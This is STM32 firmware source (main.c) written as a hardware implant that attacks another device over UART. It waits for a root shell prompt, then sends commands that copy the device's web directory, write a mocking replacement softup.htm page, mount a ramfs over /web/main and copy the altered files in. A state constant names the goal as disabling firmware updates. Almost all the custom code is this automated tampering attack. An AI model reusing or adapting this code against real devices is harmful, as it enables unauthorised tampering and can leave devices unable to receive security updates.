/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : Main program body
  ******************************************************************************
  * @attention
  *
  * <h2><center>&copy; Copyright (c) 2019 STMicroelectronics.
  * All rights reserved.</center></h2>
  *
  * This software component is licensed by ST under BSD 3-Clause license,
  * the "License"; You may not use this file except in compliance with the
  * License. You may obtain a copy of the License at:
  *                        opensource.org/licenses/BSD-3-Clause
  *
  ******************************************************************************
  */
/* USER CODE END Header */

/* Includes ------------------------------------------------------------------*/
#include "main.h"

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */
#include <string.h>
/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */

/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */
#define RX_BUFF_SIZE 100

#define CMD_SHELL_RX_BUFF_SIZE 8

#define STATE_INITIAL 0
#define STATE_PROMPT_SHELL_DETECTED 1
#define STATE_FIRMWARE_UPDATE_DISABLE_DONE 2
/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/
UART_HandleTypeDef huart1;
DMA_HandleTypeDef hdma_usart1_rx;
DMA_HandleTypeDef hdma_usart1_tx;

/* USER CODE BEGIN PV */
uint8_t g_rx_buff_size;
uint8_t g_rx_buff[RX_BUFF_SIZE];
char g_buff[RX_BUFF_SIZE];
/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_DMA_Init(void);
static void MX_USART1_UART_Init(void);
/* USER CODE BEGIN PFP */
void wait_without_lock(uint16_t);
uint8_t search_string_on_global_buffer(uint8_t, char *);
uint8_t is_root_shell_prompt_present();
void transmit_carriage_return_and_newline();
void create_new_web_main();
void copy_web_main_to_new_web_main();
void create_new_softup_web_page();
void mount_new_web_main();
void copy_new_web_main_to_web_main();
/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */

/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
  /* USER CODE BEGIN 1 */
  uint8_t state = STATE_INITIAL;
  /* USER CODE END 1 */
  

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();

  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_DMA_Init();
  MX_USART1_UART_Init();
  /* USER CODE BEGIN 2 */
  // We wait 25 seconds until target finish the boot process.
  for (uint8_t i = 0; i < 25; i++)
  {
    wait_without_lock(1);
  }
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while (1)
  {
    /* USER CODE END WHILE */
    // Check if we have a root shell.
    if (state == STATE_INITIAL)
    {
      if (is_root_shell_prompt_present() == 1)
      {
        state = STATE_PROMPT_SHELL_DETECTED;
        memset(g_rx_buff, 0x00, sizeof(g_rx_buff));
      }
      else
      {
        // In case we don't get the shell prompt we can transmit a carriage
        // return and newline to get one.
        g_rx_buff_size = CMD_SHELL_RX_BUFF_SIZE;
        HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
        transmit_carriage_return_and_newline();
        HAL_Delay(100);
      }
    }
    else if (state == STATE_PROMPT_SHELL_DETECTED)
    {
      state = STATE_FIRMWARE_UPDATE_DISABLE_DONE;
      create_new_web_main();
      copy_web_main_to_new_web_main();
      create_new_softup_web_page();
      mount_new_web_main();
      copy_new_web_main_to_web_main();
    }

    HAL_Delay(100);
    /* USER CODE END WHILE */
    /* USER CODE BEGIN 3 */
  }
  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};

  /** Initializes the CPU, AHB and APB busses clocks 
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSI;
  RCC_OscInitStruct.HSIState = RCC_HSI_ON;
  RCC_OscInitStruct.HSICalibrationValue = RCC_HSICALIBRATION_DEFAULT;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_NONE;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
  {
    Error_Handler();
  }
  /** Initializes the CPU, AHB and APB busses clocks 
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_HSI;
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_0) != HAL_OK)
  {
    Error_Handler();
  }
  PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART1;
  PeriphClkInit.Usart1ClockSelection = RCC_USART1CLKSOURCE_PCLK1;
  if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief USART1 Initialization Function
  * @param None
  * @retval None
  */
static void MX_USART1_UART_Init(void)
{

  /* USER CODE BEGIN USART1_Init 0 */

  /* USER CODE END USART1_Init 0 */

  /* USER CODE BEGIN USART1_Init 1 */

  /* USER CODE END USART1_Init 1 */
  huart1.Instance = USART1;
  huart1.Init.BaudRate = 115200;
  huart1.Init.WordLength = UART_WORDLENGTH_8B;
  huart1.Init.StopBits = UART_STOPBITS_1;
  huart1.Init.Parity = UART_PARITY_NONE;
  huart1.Init.Mode = UART_MODE_TX_RX;
  huart1.Init.HwFlowCtl = UART_HWCONTROL_NONE;
  huart1.Init.OverSampling = UART_OVERSAMPLING_16;
  huart1.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
  huart1.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
  if (HAL_UART_Init(&huart1) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN USART1_Init 2 */

  /* USER CODE END USART1_Init 2 */

}

/** 
  * Enable DMA controller clock
  */
static void MX_DMA_Init(void) 
{
  /* DMA controller clock enable */
  __HAL_RCC_DMA1_CLK_ENABLE();

  /* DMA interrupt init */
  /* DMA1_Channel2_3_IRQn interrupt configuration */
  HAL_NVIC_SetPriority(DMA1_Channel2_3_IRQn, 0, 0);
  HAL_NVIC_EnableIRQ(DMA1_Channel2_3_IRQn);

}

/**
  * @brief GPIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_GPIO_Init(void)
{

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOA_CLK_ENABLE();

}

/* USER CODE BEGIN 4 */
/*
 * This UART RX Callback function copies g_rx_buff(global UART RX buffer)
 * to g_buff(global buffer).The maximum size is defined in RX_BUFF_SIZE
 * constant.
 */
void HAL_UART_RxCpltCallback(UART_HandleTypeDef *huart)
{
  if (huart->Instance == USART1)
  {
    if (g_rx_buff_size <= (RX_BUFF_SIZE - 1))
    {
      memcpy((void *)g_buff, (void *)g_rx_buff, g_rx_buff_size);
      g_buff[g_rx_buff_size] = 0x00;
    }
  }
}

/*
 * Perform 100 milliseconds HAL_delay to avoid lock and affect the DMA
 * callback function.
 */
void wait_without_lock(uint16_t seconds)
{
  for(uint16_t i = 0; i < (seconds * 10); i++)
    HAL_Delay(100);
}

/*
 * This function performs several strstr calls on g_buff(global buffer)
 * using the string parameter. Useful to wait for g_buff to sync.
 */
uint8_t search_string_on_global_buffer(uint8_t seconds, char *string)
{
  for(uint8_t i = 0; i < (seconds * 10); i++)
  {
    if (strstr(g_buff, string) != NULL)
      return 1;
    HAL_Delay(100);
  }
  return 0;

}

/*
 * This function verifies if the global buffer contains the command
 * prompt for a root shell.
 */
uint8_t is_root_shell_prompt_present()
{
  return search_string_on_global_buffer(5, " # ");
}

/*
 * This function transmits a carriage return and new line through UART.
 *
 */
void transmit_carriage_return_and_newline()
{
  char msg[] = "\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&msg, sizeof(msg) - 1, 1000);
}

/*
 * This function create a new web main directory.
 */
void create_new_web_main()
{
  char target_cmd[] = "mkdir /var/web\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
  HAL_Delay(100);
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
}

/*
 * This function copies the web main directory content to the new web directory.
 */
void copy_web_main_to_new_web_main()
{
  char target_cmd[] = "cp /web/main/* /var/web\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
  HAL_Delay(100);
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
}

/*
 * This function creates a new soft update web page.
 */
void create_new_softup_web_page()
{
  char target_cmd_0[] = "echo '<b>Te lo updateaste ' > /var/web/softup.htm\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd_0, sizeof(target_cmd_0) - 1, 1000);
  HAL_Delay(100);
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);

  char target_cmd_1[] = "echo 'todo chinwewencha</b>' >> /var/web/softup.htm\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd_1, sizeof(target_cmd_1) - 1, 1000);
  HAL_Delay(100);
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
}

/*
 * This function mounts the new web main.
 */

void mount_new_web_main()
{
  char target_cmd[] = "mount -t ramfs -o size=1m ramfs /web/main\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
  HAL_Delay(100);
}

/*
 * This function copies the new web main directory content to the mount directory.
 */
void copy_new_web_main_to_web_main()
{
  char target_cmd[] = "cp /var/web/* /web/main/\r\n";
  HAL_UART_Transmit(&huart1, (uint8_t *)&target_cmd, sizeof(target_cmd) - 1, 1000);
  HAL_Delay(100);
  HAL_UART_Receive_DMA(&huart1, g_rx_buff, g_rx_buff_size);
}

/* USER CODE END 4 */

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */

  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(char *file, uint32_t line)
{ 
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     tex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */

/************************ (C) COPYRIGHT STMicroelectronics *****END OF FILE****/
